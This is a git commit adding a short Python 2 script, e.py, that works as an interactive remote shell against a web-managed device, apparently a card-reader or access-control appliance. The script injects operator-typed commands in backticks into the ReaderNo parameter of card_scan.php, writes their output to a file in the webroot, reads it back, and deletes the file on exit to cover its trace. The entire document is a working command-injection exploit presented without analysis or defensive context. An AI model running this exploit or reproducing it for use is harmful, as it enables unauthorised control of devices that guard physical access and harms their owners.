2ad4d6ad5d5d01a3220f3356d3713c23a5c36aff
williamlaurent <55932324+williamlaurent@users.noreply.github.com>
2020-03-15 14:23:03 +0800

    Create e.py

---
+++ e.py
@@ -0,0 +1,28 @@
+import requests
+import sys,os##
+
+piton = os.path.basename(sys.argv[0])
+
+if len(sys.argv) < 2:
+	print '\n\x20\x20[*] Usage: '+piton+' <ipaddress:port>\n'
+	sys.exit()
+
+ipaddr = sys.argv[1]
+
+print
+while True:
+	try:
+		cmd = raw_input('lighttpd@'+ipaddr+':/spider/web/webroot$ ')
+		execute = requests.get('http://'+ipaddr+'/card_scan.php?No=30&ReaderNo=%60'+cmd+' > test.txt%60')
+		readreq = requests.get('http://'+ipaddr+'/test.txt')
+		print readreq.text
+		if cmd.strip() == 'exit':
+			print "[+] Erasing read stage file and exiting..."
+			requests.get('http://'+ipaddr+'/card_scan.php?No=30&ReaderNo=%60rm test.txt%60')
+			print "[+] Done. Ba-bye!\n"
+			break
+		else: continue
+	except Exception:
+		break
+
+sys.exit()
